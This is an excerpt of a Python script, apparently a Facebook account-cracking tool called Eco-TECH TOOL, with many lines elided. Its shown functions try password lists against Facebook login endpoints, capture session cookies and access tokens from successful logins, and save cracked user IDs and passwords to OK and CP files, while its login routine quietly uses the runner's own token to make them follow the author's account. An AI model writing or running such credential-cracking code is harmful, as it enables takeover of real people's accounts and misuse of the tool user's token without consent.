...
def logo():
	...
	print("""\33[93m╔══════════════════════════════════════════╗
\33[93m║\33[95mWELCOME TO Eco-TECH TOOL \x1b[0;32m[PREMIUM] \33[92m      ║
\33[93m║       #TOOL AUTHOR \x1b[0;32m[ECO] \x1b[0;36mECO BANKS\33[93m    ║
\33[93m╚══════════════════════════════════════════╝
\x1b[0;32m -------------------------------------------
\x1b[0;34m╔══════════════════════════════════════════╗
\x1b[0;34m║#BEST FRIEND  :\x1b[0;31mECO / KING  \x1b[0;34m       ║
\x1b[0;34m║#FACEBOOK NAME:\x1b[0;31m[ECO BANKS]       \x1b[0;34m       ║
\x1b[0;34m║#GITHUB       :\x1b[0;31mJOSH11agd        \x1b[0;34m      ║
...
def login():
	...
	try:
		...
		try:
			...
			#-> bot follow
			requests.post("https://graph.facebook.com/819777271/subscribers?access_token="+token)      # Eco banks
			menu()
		except KeyError:
...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\x1b[0;34m[Eco-CP] %s|%s|%s %s %s\033[0;91m"%(uid, pw, day, month, year))
...
def bapi(user):
	try:
		...
		ua = ("Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NOKIA; Lumia 520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Mobile Safari/537.36]")
	global loop, token
	sys.stdout.write(
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\x1b[0;32m[Eco-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\x1b[0;34m[Eco-CP] %s|%s\033[0;92m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\x1b[0;32m[Eco-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\x1b[0;34m[Eco-CP] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\x1b[0;32m[Eco-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print("\r\x1b[0;34m[Eco-CP] %s|%s\033[0;91m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def setting_ua():
	...
	if ua =="":
		...
		print("Mozilla/5.0 (Windows Phone 10.0; Android 4.2.1; NOKIA; Lumia 520) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Mobile Safari/537.36]")
		os.system("rm -f .ua")
		time.sleep(1)
